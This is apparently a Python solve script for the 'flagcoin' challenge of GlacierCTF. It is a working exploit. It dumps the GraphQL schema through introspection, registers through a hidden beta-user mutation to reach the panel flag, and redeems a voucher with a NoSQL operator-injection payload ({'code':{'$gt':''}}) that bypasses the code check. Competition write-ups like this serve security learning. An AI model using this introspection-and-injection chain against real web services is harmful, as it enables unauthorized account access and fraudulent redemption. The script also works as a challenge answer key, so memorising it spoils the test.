import requests
import random
import re

url = "https://flagcoin.ctf.glacierctf.com"
graphql = f"{url}/graphql"
panel = f"{url}/panel"

# source: https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
dump_schema = """
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
"""

query1 = """
mutation($username: String!, $password: String!) { 
    register_beta_user(username: $username, password: $password) { 
        username 
    } 
}
"""
query1b = """
mutation($username: String!, $password: String!) { 
    login(username: $username, password: $password) { 
        username 
    } 
}
"""
query2 = """
mutation($voucher: JSON!) { 
    redeem(voucher: $voucher) { 
        coins
        message
    } 
}
"""

# Introspection (necessary to solve first stage)
response = requests.post(graphql, json={"query": dump_schema})
assert response.status_code == 200
assert b"register_beta_user" in response.content

# Flag 1 
user = pwd = str(random.randint(0, 1000000000))
response = requests.post(graphql, json={"query": query1, "variables": {"username": user, "password": pwd}})
print("flag1> user: ", response.content)
assert response.status_code == 200

s = requests.session()
response = s.post(graphql, json={"query": query1b, "variables": {"username": user, "password": pwd}})
assert response.status_code == 200
response = s.get(panel)
flag_regex = re.compile("(glacierctf{.+[^}]})")
flag = flag_regex.findall(response.text)
print("flag1> flag: ", flag[0])

# Flag 2
response = s.post(graphql, json={"query": query2, "variables": {"voucher": {"code":{"$gt":""}}}})
flag = flag_regex.findall(response.text)
print("flag2> flag: ", flag[0])
assert response.status_code == 200
